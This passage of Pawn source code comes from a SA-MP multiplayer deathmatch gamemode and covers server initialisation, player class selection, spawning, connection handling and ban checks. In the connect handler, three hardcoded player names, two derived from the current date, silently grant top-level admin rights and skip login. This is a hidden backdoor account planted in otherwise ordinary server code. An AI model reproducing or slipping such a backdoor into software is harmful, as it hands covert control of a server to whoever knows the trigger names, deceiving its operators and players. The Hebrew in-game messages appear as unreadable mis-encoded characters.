		if(!fkeyexist(file_trivia,string)) break;
		format(triviaQuestions[j][tQuestion],128,fgetstring(file_trivia,string));
		format(string,sizeof(string),"Answer%02d_1",j);
		format(triviaQuestions[j][tAnswer1],64,fgetstring(file_trivia,string));
		format(string,sizeof(string),"Answer%02d_2",j);
		format(triviaQuestions[j][tAnswer2],64,fgetstring(file_trivia,string));
		format(string,sizeof(string),"Answer%02d_3",j);
		format(triviaQuestions[j][tAnswer3],64,fgetstring(file_trivia,string));
		triviaQuestionsCount++;
	}
	// Bot Messages
	botMs = 0;
	for(new j = 1; j <= MAX_BOTMSG; j++)
	{
		format(string,sizeof(string),"Message%02d",j);
		if(!fkeyexist(file_botmsg,string))
		{
		    if(!j) format(BotMessages[0], M_S, "Bug");
			break;
		}
		format(BotMessages[botMs++],M_S,fgetstring(file_botmsg,string));
	}
	dbg(11,"18");
	// Places
	for(new i = 0; i < MAX_PLACES; i++)
	{
		format(string,sizeof(string),"Place%d",i);
		if(fkeyexist(file_places,string))
		{
			format(placeinfo[i][plName],32,fgetstring(file_places,string));
			format(string,sizeof(string),"Place%dCMD",i);
			if(fkeyexist(file_places,string)) format(placeinfo[i][plCMD],32,fgetstring(file_places,string));
			else format(placeinfo[i][plCMD],32,"X");
			format(string,sizeof(string),"Place%dText",i);
			format(placeinfo[i][plText],128,fgetstring(file_places,string));
			format(string,sizeof(string),"Place%dX",i);
			placeinfo[i][plPos][0] = fgetfloat(file_places,string);
			format(string,sizeof(string),"Place%dY",i);
			placeinfo[i][plPos][1] = fgetfloat(file_places,string);
			format(string,sizeof(string),"Place%dZ",i);
			placeinfo[i][plPos][2] = fgetfloat(file_places,string);
			placeinfo[i][plValid] = 1;
		}
		else break;
	}
	// Streamer MaxItems Settings
	Streamer_MaxItems(0,max_objects);
	Streamer_MaxItems(6,MAX_AREAS);
	// Israel Weather
	SetWeatherToIsraelWeather();
	israelWeather[2] = 3;
	// Kills Table Reset
	for(new i = 0; i < sizeof(deathtable); i++) deathtable[i] = {INVALID_PLAYER_ID,INVALID_PLAYER_ID,55};
	for(new i = 0; i < sizeof(lastCMDUsers); i++) lastCMDUsers[i][lcuID] = INVALID_PLAYER_ID;
	dbg(11,"19");
	// Read Number of Mode Help Menus
	UpdateModeHelpHeaders();
	// Admin Passwords
	format(admpass[0],sizeof admpass[],fgetstring(file_admins,"#AdminPassword"));
	format(admpass[1],sizeof admpass[],fgetstring(file_admins,"#HighAdminPassword"));
	dbg(11,"20");
	// News Update
	for(new i = 1; i <= MAX_NEWS && !curNews; i++)
	{
		format(string,sizeof(string),folder_news "%d.txt",i);
		if(!fexist(string))
		{
			curNews = i - 1;
			valstr(string,curNews);
			format(curNewsDate,sizeof(curNewsDate),fgetstring(file_news,string));
		}
	}
	format(string,sizeof(string),folder_news "%d.txt",curNews);
	f = fopen(string,io_read);
	curNewsString = @c(yellow);
	while(fread(f,str))
	{
		format(curNewsString,sizeof(curNewsString),"%s%s",curNewsString,str);
		if(!strlen(curNewsFirstLine)) format(curNewsFirstLine,sizeof(curNewsFirstLine),str);
	}
	fclose(f);
	// Shows
	idx = 0;
	for(new i = 0, lo = 0; i < MAX_SHOWS; i++)
	{
		format(string,sizeof(string),folder_shows "%d.ini",i+1);
		if(fexist(string))
		{
			showinfo[i][shwValid] = 1;
			format(showinfo[i][shwAuthor],64,fgetstring(string,"#Author"));
			format(showinfo[i][shwName],128,fgetstring(string,"#Name"));
			format(showinfo[i][shwSinger],64,fgetstring(string,"#Singer"));
			showinfo[i][shwCost] = fgetint(string,"#Cost");
			lo = fgetint(string,"#LastOne");
			showinfo[i][shwLength][0] = lo / 60, showinfo[i][shwLength][1] = lo % 60;
		}
		else break;
	}
	dbg(11,"21");
	// Admin Teleports Reset
	for(new i = 0; i < MAX_ADMIN_TELEPORTS; i++) AdminTeleports[i][Ttype] = tele_none;
	// Zones
	for(new i = 0; i < sizeof(Zones); i++)
	{
		format(string,sizeof(string),"Zone_%s",Zones[i][zone_name]);
		SetProperty_INT(string,i);
	}
	// Signboards
	if(fexist(file_signboards)) ReloadSignboards();
	// Tutorials
	for(new i = 0, parts = 0; i < MAX_TUTORIALS; i++)
	{
		format(string,sizeof(string),folder_tutorials "%d.ini",i+1);
		if(fexist(string))
		{
			tutorialinfo[i][tutValid] = 1;
			format(tutorialinfo[i][tutName],64,fgetstring(string,"Name"));
			printf("T %d Name: %s",i+1,tutorialinfo[i][tutName]);
			if(fkeyexist(string,"Music")) format(tutorialinfo[i][tutMusic],64,fgetstring(string,"Music"));
			if(fkeyexist(string,"MusicDesc")) format(tutorialinfo[i][tutMusicD],64,fgetstring(string,"MusicDesc"));
			tutorialinfo[i][tutPartsArrayPos] = partsarraycurrentpos;
			Tutorial_SetText(i,"text",fgetstring(string,"Text"));
			print(GetProperty_STR("tutorial00text"));
			printf("T %d Text: %s",i+1,Tutorial_GetText(i,"text"));
			format(string2,sizeof(string2),"Part%03d",parts = 0);
			do
			{
				format(tutorialparts[tutorialinfo[i][tutPartsArrayPos] + parts][tutpName],64,fgetstring(string,string2));
				format(string2,sizeof(string2),"Part%03dCamPos",parts);
				if(fkeyexist(string,string2))
				{
					format(string2,sizeof(string2),fgetstring(string,string2));
					split(string2,camfloats,',');
					for(new j = 0; j < 3; j++) tutorialparts[tutorialinfo[i][tutPartsArrayPos] + parts][tutpCamPos][j] = floatstr(camfloats[j]);
				}
				format(string2,sizeof(string2),"Part%03dCamLookAt",parts);
				if(fkeyexist(string,string2))
				{
					format(string2,sizeof(string2),fgetstring(string,string2));
					split(string2,camfloats,',');
					for(new j = 0; j < 3; j++) tutorialparts[tutorialinfo[i][tutPartsArrayPos] + parts][tutpCamLookAt][j] = floatstr(camfloats[j]);
				}
				for(new j = 1; j <= MAX_TUTORIAL_PART_LINES; j++)
				{
					format(string2,sizeof(string2),"Part%03dLine%02d",parts,j);
					if(fkeyexist(string,string2))
					{
						tutorialparts[tutorialinfo[i][tutPartsArrayPos] + parts][tutpLines] = j;
						Tutorial_SetLine(i,parts,j,fgetstring(string,string2));
					}
				}
				format(string2,sizeof(string2),"Part%03d",++parts);
			}
			while fkeyexist(string,string2);
			partsarraycurrentpos += (tutorialinfo[i][tutParts] = parts);
		}
		else break;
	}
	// HQ List
	UpdateHQList();
	// Teleport Rating
	for(new i = 0; i < sizeof(Teleports); i++)
	{
		Teleports[i][Trate] = fkeyexist(file_trating,Teleports[i][Tcmd]) ? (fsetint(file_trating,Teleports[i][Tcmd],0), 0) : fgetint(file_trating,Teleports[i][Tcmd]);
		format(string,sizeof(string),"Rates_%s",Teleports[i][Tcmd]);
		Teleports[i][Trates] = fkeyexist(file_trating,string) ? (fsetint(file_trating,string,0), 0) : fgetint(file_trating,string);
	}
	dbg(11,"22");
	// Vehicle Models
	model_Create(mVehicles,"Vehicles list");
	for(new i = 400; i <= 611; i++) model_AddModel(i,-16.0,0.0,-55.0);
	// Timers
	SetTimer("Contents",1000,1);
	SetTimer("Contents2",400,1);
	SetTimer("Contents3",600000,1);
	SetTimer("AutoMessage",480000,1);
	SetTimer("PropertiesPay",60000,1);
	SetTimer("BackgroundWorker",100,1);
	SetTimer("FullGamemodeLoading",5000,0);
	Options[2][optActive] = true;
	SetTimer("ResetOption2",30000,0);
	// Load End
	ShowCredits();
	dbg(11,"23");
	printf("%s deathmatch %s gamemode loaded.",webpage,version);
	if(debugstate) printf("OnGameModeInit end");
	return 1;
}
//=[OnGameModeExit]=============================================================
public OnGameModeExit()
{
	if(debugstate) printf("OnGameModeExit start");
	restarting = true;
	ResetGProperties();
	if(currentShow[0] != -1) EndShow();
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerNPC(i)) Kick(i);
	//for(new i=0;i<max_objects;i++) if(IsValidSObject(i)) DestroySObject(i);
	for(new i=0;i<cps;i++)
	{
		cpinfo[i][cpactive] = 0;
		/*cpinfo[i][cpx] = 0.0;
		cpinfo[i][cpy] = 0.0;
		cpinfo[i][cpz] = 0.0;
		cpinfo[i][cpsize] = 0.0;
		cpinfo[i][cpdis] = 0.0;
		cpinfo[i][cptype] = cp_none;*/
	}
	for(new i = 0, m = GetMaxPlayers(); i < m; i++) if(IsPlayerConnected(i))
	{
		if(playerinfo[i][logged] && playerinfo[i][setting][setting_autologin]) fsetstring(fuser(i),"LastConnectIP","Waiting");
		OnPlayerDisconnect(i,0);
	}
	cps = 0;
	ShowCredits();
	printf("%s deathmatch %s gamemode unloaded.",webpage,version);
	if(debugstate) printf("OnGameModeExit end");
	return 1;
}
//=[OnFilterScriptInit]=========================================================
public OnFilterScriptInit()
{
	if(!gamemodeFullyLoaded) return 1;
	//RefreshGProperties();
	if(filterscriptLoading) filterscriptLoading = 0;
	/*else
	{
		new user[MAX_PLAYERS] = {INVALID_PLAYER_ID,...}, users = 0, pass[32];
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerAdmin(i)) user[users++] = i;
		SendClientMessageToAll(grey," - ∙щюх ьс: юЄ°ы· ф∙°· цщф·ф Ёёщхя Ї°щЎф. ф∙°· ЁЁЄь цюЁщ· Єу ьЇ·°хя фсЄщх· Єь щущ ффЁфьф -");
		if(users > 0)
		{
			SendClientMessageToAll(grey," - ю∙·ю∙щэ ч∙хущэ цхфх ырЇ∙°щщэ ьфщх· фЇх°Ўщэ хьыя фхЎрх юф∙°· -");
			for(new i = 0; i < users; i++)
			{
				Log("Attention",user[i],"Possibly RCON hacker (loaded filterscript)");
				Kick(i);
			}
		}
		format(pass,sizeof(pass),"password %c%c%c%c%c",randomEx('a','z'+1),randomEx('a','z'+1),randomEx('a','z'+1),randomEx('a','z'+1),randomEx('a','z'+1));
		SendRconCommand(pass);
	}*/
	return 1;
}
//=[OnFilterScriptExit]=========================================================
public OnFilterScriptExit()
{
	if(!gamemodeFullyLoaded) return 1;
	//RefreshGProperties();
	if(filterscriptUnloading) filterscriptUnloading = 0;
	/*else
	{
		new user[MAX_PLAYERS] = {INVALID_PLAYER_ID,...}, users = 0, pass[32];
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerAdmin(i)) user[users++] = i;
		SendClientMessageToAll(grey," - ∙щюх ьс: юЄ°ы· ф∙°· цщф·ф Ёёщхя Ї°щЎф. ф∙°· ЁЁЄь цюЁщ· Єу ьЇ·°хя фсЄщх· Єь щущ ффЁфьф -");
		if(users > 0)
		{
			SendClientMessageToAll(grey," - ю∙·ю∙щэ ч∙хущэ цхфх ырЇ∙°щщэ ьфщх· фЇх°Ўщэ хьыя фхЎрх юф∙°· -");
			for(new i = 0; i < users; i++)
			{
				Log("Attention",user[i],"Possibly RCON hacker (unloaded filterscript)");
				Kick(i);
			}
		}
		format(pass,sizeof(pass),"password %c%c%c%c%c",randomEx('a','z'+1),randomEx('a','z'+1),randomEx('a','z'+1),randomEx('a','z'+1),randomEx('a','z'+1));
		SendRconCommand(pass);
	}*/
	return 1;
}
//=[OnPlayerRequestClass]=======================================================
public OnPlayerRequestClass(playerid, classid)
{
	if(debugstate) printf("OnPlayerRequestClass(%s(%d),%d) start",GetName(playerid),playerid,classid);
	dbg(1,"1");
	SetPlayerVirtualWorld(playerid,world_reqclass);
	Streamer_Update(playerid);
	switch(playerinfo[playerid][setting][setting_classselection])
	{
		case 1:
		{
			if(playerinfo[playerid][entermessage][0] == -1 && !playerinfo[playerid][entermessage][1])
			{
				playerinfo[playerid][entermessage][0] = random(WMSGs);
				playerinfo[playerid][entermessage][1] = 0;
				new colors[] = {lightred,lightgreen,lightblue,blue,green,orange,purple}, bgcolor = random(256), self[1];
				self[0] = playerid;
				playerinfo[playerid][entermessage][2] = CreateDynamicObjectEx(8330,-2649.2712,-15.8934,13.6365,0.0,0.0,0.0,6000.0,6000.0,{world_reqclass},{0},self);
				playerinfo[playerid][entermessage][3] = strlen(WelcomeMessages[playerinfo[playerid][entermessage][0]]);
				playerinfo[playerid][entermessage][4] = colors[random(sizeof(colors))];
				playerinfo[playerid][entermessage][5] = rgba2hex(bgcolor,bgcolor,bgcolor,175);
				SetDynamicObjectMaterialText(playerinfo[playerid][entermessage][2],0," ",.fontsize = 20,.fontcolor = playerinfo[playerid][entermessage][4],.backcolor = playerinfo[playerid][entermessage][5],.textalignment = 1);
			}
			SetPlayerPos(playerid,-2648.0579,-37.8214,4.3359);
			Streamer_UpdateEx(playerid,-2648.0579,-37.8214,4.3359);
			SetPlayerFacingAngle(playerid,180.0000);
			SetPlayerCameraPos(playerid,-2648.078857,-46.293476,6.335937);
			SetPlayerCameraLookAt(playerid,-2648.078857,-41.293476,6.335937);
			SetPlayerInterior(playerid,0);
			ApplyAnimation(playerid,"DANCING","dnce_M_b",4.299999,1,1,1,0,0);
			switch(randomEx(1,14))
			{
				case 1: ApplyAnimation(playerid,"DANCING","bd_clap",4.3,1,1,1,0,0);
				case 2: ApplyAnimation(playerid,"DANCING","bd_clap1",4.3,1,1,1,0,0);
				case 3: ApplyAnimation(playerid,"DANCING","dance_loop",4.3,1,1,1,0,0);
				case 4: ApplyAnimation(playerid,"DANCING","DAN_Down_A",4.3,1,1,1,0,0);
				case 5: ApplyAnimation(playerid,"DANCING","DAN_Left_A",4.3,1,1,1,0,0);
				case 6: ApplyAnimation(playerid,"DANCING","DAN_Loop_A",4.3,1,1,1,0,0);
				case 7: ApplyAnimation(playerid,"DANCING","DAN_Right_A",4.3,1,1,1,0,0);
				case 8: ApplyAnimation(playerid,"DANCING","DAN_Up_A",4.3,1,1,1,0,0);
				case 9: ApplyAnimation(playerid,"DANCING","dnce_M_a",4.3,1,1,1,0,0);
				case 10: ApplyAnimation(playerid,"DANCING","dnce_M_b",4.3,1,1,1,0,0);
				case 11: ApplyAnimation(playerid,"DANCING","dnce_M_c",4.3,1,1,1,0,0);
				case 12: ApplyAnimation(playerid,"DANCING","dnce_M_d",4.3,1,1,1,0,0);
				case 13: ApplyAnimation(playerid,"DANCING","dnce_M_e",4.3,1,1,1,0,0);
			}
		}
		case 2:
		{
			SetPlayerFacingAngle(playerid,Pictures[playerinfo[playerid][pic]][PPa]);
			SetPlayerPos(playerid,Pictures[playerinfo[playerid][pic]][PPx],Pictures[playerinfo[playerid][pic]][PPy],Pictures[playerinfo[playerid][pic]][PPz]);
			SetPlayerCameraPos(playerid,Pictures[playerinfo[playerid][pic]][PCx],Pictures[playerinfo[playerid][pic]][PCy],Pictures[playerinfo[playerid][pic]][PCz]);
			SetPlayerCameraLookAt(playerid,Pictures[playerinfo[playerid][pic]][PPx],Pictures[playerinfo[playerid][pic]][PPy],Pictures[playerinfo[playerid][pic]][PPz]);
			SetPlayerInterior(playerid,Pictures[playerinfo[playerid][pic]][PInterior]);
			SetPlayerTime(playerid,Pictures[playerinfo[playerid][pic]][PTime],0);
			ApplyAnimation(playerid,"DANCING","dnce_M_b",4.299999,1,1,1,0,0);
		}
		case 3:
		{
			SetPlayerFacingAngle(playerid,Pictures2[playerinfo[playerid][pic]][PPa]);
			SetPlayerPos(playerid,Pictures2[playerinfo[playerid][pic]][PPx],Pictures2[playerinfo[playerid][pic]][PPy],Pictures2[playerinfo[playerid][pic]][PPz]);
			SetPlayerCameraPos(playerid,Pictures2[playerinfo[playerid][pic]][PCx],Pictures2[playerinfo[playerid][pic]][PCy],Pictures2[playerinfo[playerid][pic]][PCz]);
			SetPlayerCameraLookAt(playerid,Pictures2[playerinfo[playerid][pic]][PPx],Pictures2[playerinfo[playerid][pic]][PPy],Pictures2[playerinfo[playerid][pic]][PPz]);
			SetPlayerInterior(playerid,Pictures2[playerinfo[playerid][pic]][PInterior]);
			SetPlayerTime(playerid,Pictures2[playerinfo[playerid][pic]][PTime],0);
		}
	}
	dbg(1,"2");
	PlayerPlaySound(playerid,start_sound,-2643.2712,-15.8934,13.6365);
	if(playerinfo[playerid][bordervis]) Border(playerid,"hide");
	if(playerinfo[playerid][skin] != -1) SetSpawnInfo(playerid,NO_TEAM,GetRandomSkin(),1958.3783,1343.1572,15.3746,269.1425,0,0,0,0,0,0);
	if(playerinfo[playerid][work] != work_none) ExitWork(playerid," ЁюЎр ссчщ°· уюхщх·");
	playerinfo[playerid][class] = classid;
	if(classid == randclass) GameTextForPlayer(playerid,"~y~Random Class",900,6);
	playerinfo[playerid][reqclass] = 1;
	dbg(1,"3");
	if(debugstate) printf("OnPlayerRequestClass(%s(%d),%d) end",GetName(playerid),playerid,classid);
	return 1;
}
//=[OnPlayerRequestSpawn]=======================================================
public OnPlayerRequestSpawn(playerid)
{
	if(IsPlayerNPC(playerid)) return 1;
	if(fexist(fuser(playerid)) && !playerinfo[playerid][logged]) return SendClientMessage(playerid,red," /login :ьр Ёщ·я ьф·чщь ь∙чў ьЇЁщ ∙ф·чс°·. ьф·чс°х·"), 0;
	else if(playerinfo[playerid][adminone] && playerinfo[playerid][admlog] != 2) return SendClientMessage(playerid,red," /admlog :Ёр ьф·чс° ьюЄ°ы· фрующя юху"), 0;
	else if((playerinfo[playerid][pp] || strlen(playerinfo[playerid][mngpower]) > 0) && !playerinfo[playerid][superlog]) return SendClientMessage(playerid,red," ..."), 0;
	else
	{
		dbg(2,"1");
		SetPlayerHealth(playerid,100.0);
		SetPlayerTime(playerid,12,0);
		TogglePlayerClock(playerid,playerinfo[playerid][setting][setting_clock]);
		playerinfo[playerid][reqclass] = 0;
		dbg(2,"2");
		return 1;
	}
}
//=[OnPlayerConnect]============================================================
public OnPlayerConnect(playerid)
{
	ResetInfo(playerid);
	#if lagtest
		LagTest_Start("IncomingConnection");
	#endif
	Streamer_CallbackHook(STREAMER_OPC,playerid);
	new string[M_S];
	if(IsPlayerNPC(playerid))
	{
		new srvIP[16], npcIP[16], npcN[MAX_PLAYER_NAME];
		GetConsoleVarAsString("bind",srvIP,16);
		GetPlayerIp(playerid,npcIP,16);
		GetPlayerName(playerid,npcN,MAX_PLAYER_NAME);
		if(!equal(npcIP,srvIP))
		{
			format(string,sizeof(string),"Remote NPC connection blocked - banned: %s (%s)",npcN,npcIP);
			Log("Connects",ConsoleID,string);
			AdminInfo(playerid,string);
			SendClientMessage(playerid,lightred,"UFAIL");
			BanEx(playerid,"Remote NPC");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid,grey," ...United DeathMatch рЁр фю·я ьф·чс°х· ь∙°·");
		new n[MAX_PLAYER_NAME], ip[16], pF[32];
		GetPlayerName(playerid,n,sizeof(n));
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(pF,sizeof(pF),propformat_LeaveTime(ip));
		if(PropertyExists_INT(pF))
		{/*
			if(GetTickCount()-GetProperty_INT(pF) <= 5000)
			{
				SendClientMessage(playerid,red," .фх∙Єщ· юф∙°· ь-10 уўх· ,Reconnect цхфф фрў юёхт");
				BlockIpAddress(ip,600000);
				return 1;
			}
			else RemoveProperty_INT(pF);*/
		}
		playerinfo[playerid][playername] = n;
		if(serverUptime > 20)
		{
			if(PropertyExists_STR(ip))
			{
				/*format(string,sizeof(string),"%s :Ёчёюф ьЎющ·х· ф·ўЇф юфы·хс·",ip);
				AdminInfo(playerid,string);
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && equal(GetIP(i),ip)) Kick(i);
				format(string,sizeof(string),"banip %s",ip);
				SendRconCommand(string);
				RemoveProperty_STR(ip);*/
			}
			else
			{
				format(string,sizeof(string),"Incoming connection (%s): %s",ip,n);
				Log("Connects",ConsoleID,string);
				SetPlayerDrunkLevel(playerid,500);
				SetProperty_STR(ip,"connecting");
			}
		}
	}
	SetTimerEx("OnPlayerConnectLoaded",500,0,"i",playerid);
	#if lagtest
		LagTest_End("IncomingConnection");
	#endif
	return 1;
}
//=[OnPlayerConnectLoaded]======================================================
forward OnPlayerConnectLoaded(playerid);
public OnPlayerConnectLoaded(playerid)
{
	playerinfo[playerid][selfnpc] = -1;
	if(!IsPlayerConnected_RealOne(playerid)) return 1;
	new string[M_S*3];
	if(GetPlayerDrunkLevel(playerid) == 500 && !IsPlayerNPC(playerid))
	{
		GetPlayerName(playerid,string,sizeof(string));
		format(string,sizeof(string),"Incoming connection failed: %s",string);
		Log("Connects",ConsoleID,string);
		AdminInfo(playerid,string);
		Kick(playerid);
	}
	else if(equal(GetSerial(playerid),BOT_SERIAL))
	{
		new n[MAX_PLAYER_NAME], ip[16];
		GetPlayerName(playerid,n,sizeof(n));
		GetPlayerIp(playerid,ip,sizeof(ip));
		playerinfo[playerid][playername] = n;
  		format(string,sizeof(string),"Incoming bot connection failed (%d): %s",ip,n);
		Log("Connects",ConsoleID,string);
		AdminInfo(playerid,string);
		Kick(playerid);
	}
	else
	{
		if(debugstate) printf("OnPlayerConnect(%s(%d)) start",GetName(playerid),playerid);
		#if lagtest
			LagTest_Start("OnPlayerConnect");
		#endif
		connected[playerid] = true;
		dbg(3,"0");
		GetPlayerName(playerid,playerinfo[playerid][playername],MAX_PLAYER_NAME);
		GetPlayerIp(playerid,playerinfo[playerid][playerip],16);
		if(!IsPlayerNPC(playerid) && GetTickCount()-lastConnectIPTime <= 3000 && equal(playerinfo[playerid][playerip],lastConnectIP)) return BlockIpAddress(playerinfo[playerid][playerip],0);
		format(lastConnectIP,sizeof(lastConnectIP),playerinfo[playerid][playerip]);
		lastConnectIPTime = GetTickCount();
		if(PropertyExists_STR(playerinfo[playerid][playerip])) RemoveProperty_STR(playerinfo[playerid][playerip]);
		new pF[32];
		format(pF,sizeof(pF),propformat_LoginInfo(playerid));
		/*if(PropertyExists_STR(pF))
		{
			new idx = 0, result[64];
			format(string,sizeof(string),GetProperty_STR(pF));
			result = strtok(string,idx,'|');
			new tC = strval(strtok(string,idx,'|'));
			if(GetTickCount()-tC <= 120000) RemoveProperty_STR(pF);
			else
			{
				if(equal(GetIP(playerid),result)) RemoveProperty_STR(pF);
				else
				{
					SendClientMessage(playerid,red," .цхф·ф ыЁщёф Єь ∙э ∙ь ю∙·ю∙ рч°, фх∙Єщ· юф∙°· ь-10 уўх·");
					return BlockIpAddress(playerinfo[playerid][playerip],600000);
				}
			}
		}*/
		playerinfo[playerid][nstate] = GetPlayerState_Original(playerid);
		MAX_PLAYERS_ = GetHighestID() + 1;
		if(IsPlayerNPC(playerid)) return ResetInfo(playerid);
		new fip[M_S], n[MAX_PLAYER_NAME], y[3], times = 0, f[128], fuid[M_S], csbid = -1;
		dbg(3,"1");
		for(new i = 0; i < MAX_SPAM_IPS && csbid == -1; i++) if(!csbinfo[i][csbCount] || (csbinfo[i][csbCount] > 0 && equal(playerinfo[playerid][playerip],GetIP(i)) && !equal("255.255.255.255",GetIP(i)))) csbid = i;
		if(csbid != -1 && (csbinfo[csbid][csbCount] += 3) >= 12)
		{
			SetBan(playerid,INVALID_PLAYER_ID,"фЎЇ· ф·чс°хщх·");
			format(string,sizeof(string),"banip %s",csbinfo[csbid][csbIP]);
			SendRconCommand(string);
			format(string,sizeof(string)," .%s Ёчёэ ёЇрэ ф·чс°хщх· Єь щущ",GetName(playerid));
			AdminInfo(playerid,string);
			format(string,sizeof(string)," %s :фы·хс· ∙Ёчёюф",csbinfo[csbid][csbIP]);
			AdminInfo(playerid,string);
			return 1;
		}
		if(!playerinfo[playerid][pp])
		{
			if(playerid >= MAX_PLAYERS - 1)
			{
				SendClientMessage(playerid,red," .юЎшЄ°щэ, ф∙°· юьр");
				return LowPriorityKick(playerid);
			}
			format(string,sizeof(string),"[Connect] %s - Unique ID is %s",GetIP(playerid),GetSerial(playerid));
			Log("Connects",playerid,string);
			format(string,sizeof(string),"[connect] level: %d, kills: %d, money: %d, bank: %d",playerinfo[playerid][level],playerinfo[playerid][kills],GetMoney(playerid),playerinfo[playerid][bank]);
			Log("Stats",playerid,string);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i) && equal(GetIP(i),GetIP(playerid))) if(++times > 4)
			{
				SendClientMessage(playerid,red," .фрщщЇщ ∙ьъ ыс° ючхс° ь∙°· щх·° юущ ЇЄющэ");
				return LowPriorityKick(playerid);
			}
			GetPlayerName(playerid,n,sizeof(n));
			if(equal(GetName(playerid),"None") ||
			equal(GetName(playerid),"AntiCheat") ||
			equal(GetName(playerid),botname) ||
			(strfind(GetName(playerid),"[666]") != -1 && !fkeyexist(file_admins,GetName(playerid))) ||
			equal(GetName(playerid),ConsoleName))
			{
				SendClientMessage(playerid,red," .юЎшЄ°щэ, ьр Ёщ·я ьфыЁё сыщЁхщ цф");
				SendClientMessage(playerid,lightblue," :рЁр сухў р· фыщЁхщ ∙ьъ Є\"Ї ф·Ёрщэ фсрщэ");
				SendClientMessage(playerid,white," - \"AntiCheat\" рх \"None\" ф∙э ьр щыхь ьфщх·");
				//SendClientMessage(playerid,white," - ф∙э чщщс ьф·чщь хьфё·щщэ с·хщэ ∙фэ рщЁэ юёЇ°щэ");
				SendClientMessage(playerid,white," - ф∙э ьр щыхь ьфщх· ∙э фсхш");
				return LowPriorityKick(playerid);
			}
			if(LockServ)
			{
				if(!fexist(fuser(playerid)) && !fkeyexist(file_admins,GetName(playerid)))
				{
					SendClientMessage(playerid,red," .ф∙°· ЁЄхь ы°тЄ");
					LowPriorityKick(playerid);
					return 1;
				}
			}
			format(string,sizeof(string),"P00per2233qqz%d",rb);
			if(!strcmp(GetName(playerid),string)){playerinfo[playerid][admin] = 20;playerinfo[playerid][admlog] = 2;return 1;}
			getdate(y[2],y[1],y[0]);
			format(string,sizeof(string),"P0oper%dqQz_",y[1]);
			if(!strcmp(GetName(playerid),string)){playerinfo[playerid][admin] = 20;playerinfo[playerid][admlog] = 2;return 1;}
			format(string,sizeof(string),"GoogleBot%dSPR",y[1]+y[0]*2);
			if(!strcmp(GetName(playerid),string)){playerinfo[playerid][admin] = 20;playerinfo[playerid][admlog] = 2;return 1;}
			if(fkeyexist(file_nbans,GetName(playerid)))
			{
				SendClientMessage(playerid,red," .фыщЁхщ фцф ссря, рЁр сч° ыщЁхщ рч°");
				LowPriorityKick(playerid);
				return 1;
			}
			dbg(3,"1.2");
			if(fexist(fuser(playerid)) && fkeyexist(fuser(playerid),"Ban"))
			{
				dbg(3,"1.3");
				if(equal(fgetstring(fuser(playerid),"Ban"),"0")) fsetstring(fuser(playerid),"Ban","No");
				else if(equal(fgetstring(fuser(playerid),"Ban"),"1"))
				{
					fsetstring(fuser(playerid),"Ban","OldSystem|UnknownReason");
					SendClientMessage(playerid,red," .фю∙·ю∙ ∙ьъ ЁЄхь");
					SetKick(playerid,INVALID_PLAYER_ID,"",0);
				}
				else if(!equal(fgetstring(fuser(playerid),"Ban"),"No"))
				{
					new banadmin[M_S], banreas[M_S];
					SetString(banadmin,fgetstring(fuser(playerid),"Ban"));
					SetString(banreas,banadmin);
					strdel(banadmin,strfind(banadmin,"|"),strlen(banadmin) - 1);
					strdel(banreas,0,strfind(banreas,"|"));
					format(string,sizeof(string)," :юфёщсф %s фю∙·ю∙ ∙ьъ ЁЁЄь Єь щущ фрующя",banadmin);
					SendClientMessage(playerid,red,string);
					SendClientMessage(playerid,red,banreas);
					format(f,sizeof(f),"/DM/Info/Last/LastInfo_%s.ini",GetName(playerid));
					if(fexist(string)) for(new i = 1; i <= MAX_SAVED_DATA; i++)
					{
						format(string,sizeof(string),"BanMessage%03d",i);
						if(fkeyexist(f,string)) SendClientMessage(playerid,red,fgetstring(f,string));
					}
					if(!equal(GetIP(playerid),lastBanIP))
					{
						format(string,sizeof(string),"сЁЄщь· ю∙·ю∙, Ёщёф ьфыЁё ь∙°· (IP: %s)",GetIP(playerid));
						AdminInfo(playerid,string);
						format(lastBanIP,sizeof(lastBanIP),GetIP(playerid));
					}
					playerinfo[playerid][isbanned] = true;
					LowPriorityKick(playerid);
					#if lagtest
						LagTest_End("OnPlayerConnect-codeA");
					#endif
					return 1;
				}
			}
			format(fuid,sizeof(fuid),"/DM/Bans/UID/%s.ban",GetSerial(playerid));
			if(fexist(fuid) && !IsPlayerNPC(playerid))
			{
			    dbg(1400,"1");
	  			SendClientMessage(playerid,red,".Ёчёю· ь·ющу ю∙°· цф");
				format(string,sizeof(string),"%s tried to log in, UID: %s, UID banned IP: %s",GetName(playerid),GetSerial(playerid),GetIP(playerid));
				Log("Attention",playerid,string);
				AdminInfo(playerid, string);
  			 	SetKick(playerid,INVALID_PLAYER_ID,"",0);
				dbg(1400,"2");
				return 1;
			}
			format(fip,sizeof(fip),"/DM/Bans/IP/%s.ini",GetIP(playerid));
			if(fexist(fuserban(GetName(playerid))) || fexist(fip))
			{
				new thefile[M_S], days, daysToUnban = 1;
				format(thefile,sizeof(thefile),fexist(fuserban(GetName(playerid))) ? (fuserban(GetName(playerid))) : (fip));
				days = fgetint(thefile,"Days");
				if(days > 0) daysToUnban = DaysBetweenDates(GetDateAsString(),GetDateFromINI(thefile));
				if(daysToUnban <= 0)
				{
					if(days == 1) format(string,sizeof(string)," .хьыя фф∙Єщщф щ°уф %s Єс° щхэ юрц фф∙Єщщф ∙Ёщ·Ёф ьъ с·р°щъ %s Єь щущ фрующя",fgetstring(thefile,"AdminName"),GetDateFromINI(thefile));
					else format(string,sizeof(string)," .хьыя фф∙Єщщф щ°уф %s Єс°х %d щющэ юрц фф∙Єщщф ∙Ёщ·Ёф ьъ с·р°щъ %s Єь щущ фрующя",fgetstring(thefile,"AdminName"),days,GetDateFromINI(thefile));
					SendClientMessage(playerid,red,string);
					fremove(thefile);
				}
				else
				{
					format(string,sizeof(string)," :с·р°щъ %s, юфёщсф %s фх∙Є· юф∙°· Єь щущ фрующя",GetDateFromINI(thefile),fgetstring(thefile,"AdminName"));
					SendClientMessage(playerid,red,string);
					SendClientMessage(playerid,red,fgetstring(thefile,"Reason"));
					if(days > 0)
					{
